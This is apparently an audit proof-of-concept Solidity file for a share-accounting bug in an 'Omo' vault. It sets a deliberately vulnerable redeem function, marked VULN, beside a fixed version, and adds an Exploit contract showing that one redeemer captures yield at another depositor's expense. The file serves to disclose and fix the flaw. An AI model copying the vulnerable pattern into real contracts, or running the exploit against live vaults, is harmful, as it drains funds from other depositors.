// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Omo — redeem moves shares onto the vault and leaves totalSupply and totalAssets
    unchanged (Pashov, 2025-01-25). A later 100 of yield is priced against the
    pending shares. topOff pays Alice 150 for a 100-share exit that was worth 100
    at request time. Bob, who still holds 100 shares, is left 150 instead of 200.
    The fixed redeem removes the shares and the assets from the price before the yield. */

contract Asset {
    string public symbol = "USDC";
    uint8 public constant decimals = 18;
    address public minter;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor() {
        minter = msg.sender;
    }

    function mint(address to, uint256 amount) external {
        require(msg.sender == minter, "minter");
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoVault {
    Asset public asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public pendingShares;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function deposit(address to, uint256 assets) external {
        asset.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalSupply += assets;
        balanceOf[to] += assets;
    }

    function redeem(address owner, uint256 shares) external {
        balanceOf[owner] -= shares;
        balanceOf[address(this)] += shares;
        pendingShares[owner] += shares; // @> VULN: totalSupply and totalAssets still include this exit
    }

    function price() public view returns (uint256) {
        return totalAssets * 1e18 / totalSupply;
    }

    function accrue(uint256 profit) external {
        asset.transferFrom(msg.sender, address(this), profit);
        totalAssets += profit;
    }

    function topOff(address user) external returns (uint256 assetsOut) {
        uint256 shares = pendingShares[user];
        assetsOut = shares * price() / 1e18;
        pendingShares[user] = 0;
        balanceOf[address(this)] -= shares;
        totalSupply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(user, assetsOut);
    }

    function withdrawAll() external returns (uint256 assetsOut) {
        uint256 shares = balanceOf[msg.sender];
        assetsOut = shares * price() / 1e18;
        balanceOf[msg.sender] = 0;
        totalSupply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }
}

contract OmoVaultFixed {
    Asset public asset;
    uint256 public totalAssets;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public pendingAssets;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function deposit(address to, uint256 assets) external {
        asset.transferFrom(msg.sender, address(this), assets);
        totalAssets += assets;
        totalSupply += assets;
        balanceOf[to] += assets;
    }

    function redeem(address owner, uint256 shares) external {
        uint256 assetsLocked = shares * totalAssets / totalSupply;
        balanceOf[owner] -= shares;
        totalSupply -= shares;
        totalAssets -= assetsLocked;
        pendingAssets[owner] += assetsLocked;
    }

    function accrue(uint256 profit) external {
        asset.transferFrom(msg.sender, address(this), profit);
        totalAssets += profit;
    }

    function topOff(address user) external returns (uint256 assetsOut) {
        assetsOut = pendingAssets[user];
        pendingAssets[user] = 0;
        asset.transfer(user, assetsOut);
    }

    function withdrawAll() external returns (uint256 assetsOut) {
        uint256 shares = balanceOf[msg.sender];
        assetsOut = shares * totalAssets / totalSupply;
        balanceOf[msg.sender] = 0;
        totalSupply -= shares;
        totalAssets -= assetsOut;
        asset.transfer(msg.sender, assetsOut);
    }
}

contract Bob {
    function withdraw(OmoVault vault) external returns (uint256) {
        return vault.withdrawAll();
    }

    function withdrawFixed(OmoVaultFixed vault) external returns (uint256) {
        return vault.withdrawAll();
    }
}

contract Exploit {
    Asset public asset; // nonce 1
    OmoVault public vault; // nonce 2
    Bob public bob; // nonce 3
    uint256 public aliceAssets;
    uint256 public bobAssets;
    uint256 public priceAfterYield;

    constructor() {
        asset = new Asset();
        vault = new OmoVault(asset);
        bob = new Bob();
    }

    function run() external {
        asset.mint(address(this), 200 ether);
        asset.approve(address(vault), 200 ether);
        vault.deposit(address(this), 100 ether);
        vault.deposit(address(bob), 100 ether);
        require(vault.price() == 1 ether, "price 1");
        vault.redeem(address(this), 100 ether);
        require(vault.totalSupply() == 200 ether, "supply stale");
        require(vault.totalAssets() == 200 ether, "assets stale");
        asset.mint(address(this), 100 ether);
        asset.approve(address(vault), 100 ether);
        vault.accrue(100 ether);
        priceAfterYield = vault.price();
        require(priceAfterYield == 1.5 ether, "price 1.5");
        aliceAssets = vault.topOff(address(this));
        bobAssets = bob.withdraw(vault);
        require(aliceAssets == 150 ether, "alice 150");
        require(bobAssets == 150 ether, "bob 150");
        require(asset.balanceOf(address(bob)) == 150 ether, "bob paid 150");
    }
}
